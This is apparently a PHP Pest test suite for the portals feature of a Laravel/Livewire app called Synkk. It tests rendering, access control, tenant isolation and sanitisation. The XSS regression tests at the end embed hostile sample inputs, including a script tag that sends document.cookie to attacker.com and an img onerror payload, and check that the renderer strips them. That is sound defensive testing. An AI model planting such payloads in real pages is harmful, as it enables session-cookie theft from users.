<?php

use App\Models\Team;
use App\Models\User;
use App\Models\Vault;
use App\Models\VaultFile;
use App\Models\VaultPortal;
use App\Services\PortalRendererService;
use Illuminate\Support\Facades\Storage;
use Livewire\Livewire;

beforeEach(function () {
    $this->user = User::factory()->create();
    $this->team = Team::factory()->create();
    $this->team->members()->attach($this->user, ['role' => 'owner']);
    $this->user->switchTeam($this->team);
    $this->actingAs($this->user);

    $this->vault = Vault::create([
        'team_id' => $this->team->id,
        'name' => 'Knowledge Base',
        'slug' => 'knowledge-base',
        'created_by' => $this->user->id,
        'default_permission' => 'read_write',
    ]);

    $disk = config('synkk.storage_disk', 'local');
    Storage::fake($disk);

    $content1 = "---\ntitle: Welcome to Synkk\ntags: [guide, onboarding]\nbadge: New\n---\n# Welcome to Synkk\nThis is the sovereign sync documentation.\n\n> [!NOTE]\n> Synkk keeps your data sovereign.\n\nCheck out [[Architecture]] for deep dive details.";
    $storagePath1 = 'vaults/'.$this->vault->id.'/Getting Started.md';
    Storage::disk($disk)->put($storagePath1, $content1);

    $this->file1 = VaultFile::create([
        'vault_id' => $this->vault->id,
        'path' => 'Getting Started.md',
        'storage_path' => $storagePath1,
        'sha256' => hash('sha256', $content1),
        'size' => strlen($content1),
        'mime_type' => 'text/markdown',
        'version' => 1,
        'is_deleted' => false,
    ]);

    $content2 = "---\ntitle: Sovereign Architecture\ntags: [tech, security]\n---\n# Sovereign Architecture\nSynkk runs on SQLite with WAL mode.";
    $storagePath2 = 'vaults/'.$this->vault->id.'/Architecture.md';
    Storage::disk($disk)->put($storagePath2, $content2);

    $this->file2 = VaultFile::create([
        'vault_id' => $this->vault->id,
        'path' => 'Architecture.md',
        'storage_path' => $storagePath2,
        'sha256' => hash('sha256', $content2),
        'size' => strlen($content2),
        'mime_type' => 'text/markdown',
        'version' => 1,
        'is_deleted' => false,
    ]);
});

test('portals studio index displays team portals and metrics', function () {
    $portal = VaultPortal::create([
        'team_id' => $this->team->id,
        'vault_id' => $this->vault->id,
        'name' => 'Public Docs',
        'slug' => 'public-docs',
        'layout' => 'docs',
        'theme' => 'obsidian-noir',
        'is_public' => true,
        'created_by' => $this->user->id,
    ]);

    $response = $this->get(route('portals.index', ['current_team' => $this->team->slug]));

    $response->assertOk()
        ->assertSee('Synkk Portals Studio')
        ->assertSee('Public Docs')
        ->assertSee('/p/public-docs');
});

test('team member can create a new portal via studio', function () {
    Livewire::test('pages::portals.index', ['current_team' => $this->team->slug])
        ->call('openCreateModal')
        ->assertDispatched('modal-show', name: 'portal-modal')
        ->assertSet('vault_id', $this->vault->id)
        ->set('name', 'Product Blueprint')
        ->set('slug', 'product-blueprint')
        ->set('layout', 'bento')
        ->set('theme', 'midnight-emerald')
        ->set('description', 'Interactive roadmap and design system')
        ->call('savePortal')
        ->assertHasNoErrors()
        ->assertDispatched('modal-close', name: 'portal-modal');

    $portal = VaultPortal::where('slug', 'product-blueprint')->first();
    expect($portal)->not->toBeNull()
        ->and($portal->name)->toBe('Product Blueprint')
        ->and($portal->layout)->toBe('bento')
        ->and($portal->theme)->toBe('midnight-emerald');
});

test('editing a portal dispatches modal-show and populates state', function () {
    $portal = VaultPortal::create([
        'team_id' => $this->team->id,
        'vault_id' => $this->vault->id,
        'name' => 'Internal Docs',
        'slug' => 'internal-docs',
        'layout' => 'docs',
        'theme' => 'obsidian-noir',
        'is_public' => false,
        'created_by' => $this->user->id,
    ]);

    Livewire::test('pages::portals.index', ['current_team' => $this->team->slug])
        ->call('editPortal', $portal->id)
        ->assertDispatched('modal-show', name: 'portal-modal')
        ->assertSet('editingPortalId', $portal->id)
        ->assertSet('name', 'Internal Docs')
        ->set('name', 'Updated Internal Docs')
        ->call('savePortal')
        ->assertHasNoErrors()
        ->assertDispatched('modal-close', name: 'portal-modal');

    expect($portal->fresh()->name)->toBe('Updated Internal Docs');
});

test('public portal renders docs layout with active note, callouts, and backlinks', function () {
    $portal = VaultPortal::create([
        'team_id' => $this->team->id,
        'vault_id' => $this->vault->id,
        'name' => 'Developer Hub',
        'slug' => 'dev-hub',
        'layout' => 'docs',
        'theme' => 'obsidian-noir',
        'is_public' => true,
        'created_by' => $this->user->id,
    ]);

    auth()->logout();

    $response = $this->get(route('portal.show', ['slug' => 'dev-hub']));

    $response->assertOk()
        ->assertSee('Developer Hub')
        ->assertSee('Sovereign Architecture')
        ->assertSee('Synkk runs on SQLite with WAL mode.')
        ->assertSee('Getting Started');

    // Specify note path
    $noteResponse = $this->get(route('portal.show', ['slug' => 'dev-hub', 'note' => 'Getting Started.md']));
    $noteResponse->assertOk()
        ->assertSee('Welcome to Synkk')
        ->assertSee('Synkk keeps your data sovereign.');
});

test('public portal renders bento grid and client dashboard layouts', function () {
    $portal = VaultPortal::create([
        'team_id' => $this->team->id,
        'vault_id' => $this->vault->id,
        'name' => 'Showcase Portal',
        'slug' => 'showcase-portal',
        'layout' => 'bento',
        'theme' => 'slate-luxe',
        'is_public' => true,
        'created_by' => $this->user->id,
    ]);

    auth()->logout();

    // Bento layout
    $bentoResponse = $this->get(route('portal.show', ['slug' => 'showcase-portal']));
    $bentoResponse->assertOk()
        ->assertSee('Showcase Portal')
        ->assertSee('Welcome to Synkk')
        ->assertSee('Sovereign Architecture');

    // Dashboard layout override
    $dashResponse = $this->get(route('portal.show', ['slug' => 'showcase-portal', 'layout' => 'dashboard']));
    $dashResponse->assertOk()
        ->assertSee('Client Portal &amp; Knowledge Center', escape: false)
        ->assertSee('Knowledge Documents');
});

test('password protected portal locks guest access until correct password is submitted', function () {
    $portal = VaultPortal::create([
        'team_id' => $this->team->id,
        'vault_id' => $this->vault->id,
        'name' => 'Client Vault',
        'slug' => 'client-vault',
        'layout' => 'docs',
        'theme' => 'paper-craft',
        'password' => 'secret123',
        'is_public' => true,
        'created_by' => $this->user->id,
    ]);

    auth()->logout();

    // Initial visit shows password lock screen
    $response = $this->get(route('portal.show', ['slug' => 'client-vault']));
    $response->assertOk()
        ->assertSee('This portal is password protected')
        ->assertDontSee('This is the sovereign sync documentation.');

    // Submitting wrong password fails
    Livewire::test('pages::portals.show', ['slug' => 'client-vault'])
        ->set('passwordInput', 'wrongpassword')
        ->call('unlock')
        ->assertHasErrors(['passwordInput']);

    // Submitting correct password unlocks portal
    Livewire::test('pages::portals.show', ['slug' => 'client-vault'])
        ->set('passwordInput', 'secret123')
        ->call('unlock')
        ->assertHasNoErrors()
        ->assertSet('isUnlocked', true);

    expect($portal->fresh()->views_count)->toBeGreaterThan(0);
});

test('private portal denies unauthenticated guests with 404 to hide existence (P0-02)', function () {
    VaultPortal::create([
        'team_id' => $this->team->id,
        'vault_id' => $this->vault->id,
        'name' => 'Internal Portal',
        'slug' => 'internal-portal',
        'layout' => 'docs',
        'theme' => 'obsidian-noir',
        'is_public' => false,
        'created_by' => $this->user->id,
    ]);

    auth()->logout();

    $response = $this->get(route('portal.show', ['slug' => 'internal-portal']));
    $response->assertNotFound(); // 404 prevents slug enumeration (P0-02)
});

test('portal renderer service parses frontmatter, callouts, and wikilinks', function () {
    $service = app(PortalRendererService::class);
    $markdown = <<<'MD'
---
title: Advanced Guide
tags: [alpha, beta]
---
# Guide Header

> [!WARNING]
> Critical alert message.

Check out [[Getting Started]] and [[Architecture|The System Blueprint]].
MD;

    $rendered = $service->renderNoteHtml($markdown, new VaultPortal, collect([$this->file1, $this->file2]));

    expect($rendered['frontmatter']['title'])->toBe('Advanced Guide')
        ->and($rendered['frontmatter']['tags'])->toEqual(['alpha', 'beta'])
        ->and($rendered['html'])->toContain('Critical alert message.')
        ->and($rendered['html'])->toContain('border-amber-500')
        ->and($rendered['html'])->toContain('data-preview-title="Welcome to Synkk"')
        ->and($rendered['html'])->toContain('The System Blueprint');
});

test('subfolder root path scopes accessible files strictly to the subfolder', function () {
    $disk = config('synkk.storage_disk', 'local');

    $secPath = 'vaults/'.$this->vault->id.'/Secret/Confidential.md';
    Storage::disk($disk)->put($secPath, 'Top secret content');
    VaultFile::create([
        'vault_id' => $this->vault->id,
        'path' => 'Secret/Confidential.md',
        'storage_path' => $secPath,
        'sha256' => hash('sha256', 'Top secret content'),
        'size' => 50,
        'mime_type' => 'text/markdown',
        'version' => 1,
        'is_deleted' => false,
    ]);

    $pubPath = 'vaults/'.$this->vault->id.'/Public/Published Guide.md';
    Storage::disk($disk)->put($pubPath, 'Public guide content');
    VaultFile::create([
        'vault_id' => $this->vault->id,
        'path' => 'Public/Published Guide.md',
        'storage_path' => $pubPath,
        'sha256' => hash('sha256', 'Public guide content'),
        'size' => 60,
        'mime_type' => 'text/markdown',
        'version' => 1,
        'is_deleted' => false,
    ]);

    $portal = VaultPortal::create([
        'team_id' => $this->team->id,
        'vault_id' => $this->vault->id,
        'name' => 'Public Only',
        'slug' => 'public-only',
        'root_path' => '/Public',
        'layout' => 'docs',
        'theme' => 'obsidian-noir',
        'is_public' => true,
        'created_by' => $this->user->id,
    ]);

    $accessiblePaths = $portal->getAccessibleFiles()->pluck('path')->all();

    expect($accessiblePaths)->toContain('Public/Published Guide.md')
        ->and($accessiblePaths)->not->toContain('Secret/Confidential.md')
        ->and($accessiblePaths)->not->toContain('Getting Started.md');
});

test('portal renderer service wraps code fences in macOS chrome windows with traffic lights and copy button', function () {
    $service = app(PortalRendererService::class);
    $markdown = <<<'MD'
# Code Example

```php
echo "Hello Synkk";
```
MD;

    $rendered = $service->renderNoteHtml($markdown, new VaultPortal, collect([$this->file1]));

    expect($rendered['html'])->toContain('synkk-code-window')
        ->and($rendered['html'])->toContain('synkk-traffic-lights')
        ->and($rendered['html'])->toContain('synkk-dot-red')
        ->and($rendered['html'])->toContain('synkk-dot-yellow')
        ->and($rendered['html'])->toContain('synkk-dot-green')
        ->and($rendered['html'])->toContain('synkk-code-lang')
        ->and($rendered['html'])->toContain('PHP')
        ->and($rendered['html'])->toContain('synkk-code-copy-btn');
});

test('portal renderer service wraps tables in responsive container', function () {
    $service = app(PortalRendererService::class);
    $markdown = <<<'MD'
| Feature | Supported |
| --- | --- |
| Local SQLite | Yes |
| Obsidian | Yes |
MD;

    $rendered = $service->renderNoteHtml($markdown, new VaultPortal, collect([$this->file1]));

    expect($rendered['html'])->toContain('synkk-prose-table-container')
        ->and($rendered['html'])->toContain('<table>');
});

test('portal show component supports switching themes and layouts dynamically', function () {
    $portal = VaultPortal::create([
        'team_id' => $this->team->id,
        'vault_id' => $this->vault->id,
        'name' => 'Studio Hub',
        'slug' => 'studio-hub',
        'layout' => 'docs',
        'theme' => 'obsidian-noir',
        'is_public' => true,
        'created_by' => $this->user->id,
    ]);

    Livewire::test('pages::portals.show', ['slug' => 'studio-hub'])
        ->assertSet('currentLayout', 'docs')
        ->assertSet('currentTheme', 'obsidian-noir')
        ->call('switchLayout', 'bento')
        ->assertSet('currentLayout', 'bento')
        ->call('switchTheme', 'midnight-emerald')
        ->assertSet('currentTheme', 'midnight-emerald')
        ->call('switchLayout', 'dashboard')
        ->assertSet('currentLayout', 'dashboard')
        ->call('switchLayout', 'graph')
        ->assertSet('currentLayout', 'graph');
});

test('portal renderer service callout blocks never produce broken html or code-escaped div tags', function () {
    $service = app(PortalRendererService::class);
    $markdown = <<<'MD'
# Deep Architecture

> [!NOTE] Sovereign Sync Protocol
> This is a multiline note.
> It has multiple lines of explanation.
> Check out [[Welcome to Synkk]] inside the note.

Regular paragraph following callout.
MD;

    $rendered = $service->renderNoteHtml($markdown, new VaultPortal, collect([$this->file1]));

    expect($rendered['html'])->toContain('synkk-callout--note')
        ->and($rendered['html'])->toContain('Sovereign Sync Protocol')
        ->and($rendered['html'])->toContain('This is a multiline note.')
        ->and($rendered['html'])->not->toContain('&lt;/div&gt;')
        ->and($rendered['html'])->not->toContain('<pre><code class="language-code">&lt;/div&gt;');
});

// --- P0-01 Regression: Cross-Tenant Portal Vault Validation ---

test('team member cannot create a portal pointing to another tenant vault (P0-01)', function () {
    // Create a second independent team with its own vault
    $otherTeam = Team::factory()->create();
    $otherVault = Vault::create([
        'team_id' => $otherTeam->id,
        'name' => 'Confidential Vault',
        'slug' => 'confidential-vault',
        'created_by' => User::factory()->create()->id,
        'default_permission' => 'read_write',
    ]);

    // The current user (Team A) tries to create a portal pointing to Team B's vault
    Livewire::test('pages::portals.index', ['current_team' => $this->team->slug])
        ->set('name', 'Hijacked Portal')
        ->set('vault_id', $otherVault->id) // ← other team's vault
        ->set('layout', 'docs')
        ->set('theme', 'obsidian-noir')
        ->call('savePortal')
        ->assertHasErrors(['vault_id']); // must fail validation

    expect(VaultPortal::where('name', 'Hijacked Portal')->exists())->toBeFalse();
});

test('updating a portal cannot reassign it to another tenant vault (P0-01)', function () {
    $portal = VaultPortal::create([
        'team_id' => $this->team->id,
        'vault_id' => $this->vault->id,
        'name' => 'My Portal',
        'slug' => 'my-portal',
        'layout' => 'docs',
        'theme' => 'obsidian-noir',
        'is_public' => true,
        'created_by' => $this->user->id,
    ]);

    $otherVault = Vault::create([
        'team_id' => Team::factory()->create()->id,
        'name' => 'Foreign Vault',
        'slug' => 'foreign-vault',
        'created_by' => User::factory()->create()->id,
        'default_permission' => 'read_write',
    ]);

    Livewire::test('pages::portals.index', ['current_team' => $this->team->slug])
        ->call('editPortal', $portal->id)
        ->set('vault_id', $otherVault->id) // ← inject foreign vault id
        ->call('savePortal')
        ->assertHasErrors(['vault_id']);

    expect($portal->fresh()->vault_id)->toBe($this->vault->id);
});

// --- P0-02 Regression: Private Portal Team Membership Enforcement ---

test('authenticated user from a different team gets 404 for private portal (P0-02)', function () {
    VaultPortal::create([
        'team_id' => $this->team->id,
        'vault_id' => $this->vault->id,
        'name' => 'Private Docs',
        'slug' => 'private-docs',
        'layout' => 'docs',
        'theme' => 'obsidian-noir',
        'is_public' => false,
        'created_by' => $this->user->id,
    ]);

    // A completely different user who is NOT a member of $this->team
    $outsider = User::factory()->create();
    $this->actingAs($outsider);

    $response = $this->get(route('portal.show', ['slug' => 'private-docs']));

    // Must be 404 — not content, not 403 (to hide slug existence)
    $response->assertNotFound();
});

test('unauthenticated visitor gets 404 for private portal (P0-02)', function () {
    VaultPortal::create([
        'team_id' => $this->team->id,
        'vault_id' => $this->vault->id,
        'name' => 'Members Only',
        'slug' => 'members-only',
        'layout' => 'docs',
        'theme' => 'obsidian-noir',
        'is_public' => false,
        'created_by' => $this->user->id,
    ]);

    auth()->logout();

    $response = $this->get(route('portal.show', ['slug' => 'members-only']));
    $response->assertNotFound();
});

test('actual team member can access a private portal (P0-02)', function () {
    $portal = VaultPortal::create([
        'team_id' => $this->team->id,
        'vault_id' => $this->vault->id,
        'name' => 'Team Only Portal',
        'slug' => 'team-only-portal',
        'layout' => 'docs',
        'theme' => 'obsidian-noir',
        'is_public' => false,
        'created_by' => $this->user->id,
    ]);

    // $this->user is already a member of $this->team via beforeEach
    $response = $this->get(route('portal.show', ['slug' => 'team-only-portal']));
    $response->assertOk();
});

// --- P0-04 Regression: XSS Prevention in Portal Renderer ---

test('portal renderer strips raw HTML script tags from markdown (P0-04)', function () {
    $service = app(PortalRendererService::class);
    $maliciousMarkdown = <<<'MD'
# Normal Heading

<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

Regular paragraph after script tag.

<img src="x" onerror="alert('xss')">
MD;

    $rendered = $service->renderNoteHtml($maliciousMarkdown, new VaultPortal, collect([$this->file1]));

    expect($rendered['html'])
        ->not->toContain('<script>')
        ->not->toContain('document.cookie')
        ->not->toContain('onerror=')
        ->toContain('Regular paragraph after script tag.');
});

test('portal renderer strips HTML in callout bodies (P0-04)', function () {
    $service = app(PortalRendererService::class);
    $maliciousMarkdown = <<<'MD'
> [!NOTE] Legit callout
> <script>alert('callout xss')</script>
> Safe content after
MD;

    $rendered = $service->renderNoteHtml($maliciousMarkdown, new VaultPortal, collect([$this->file1]));

    expect($rendered['html'])
        ->not->toContain('<script>')
        ->not->toContain("alert('callout xss')")
        ->toContain('Safe content after');
});
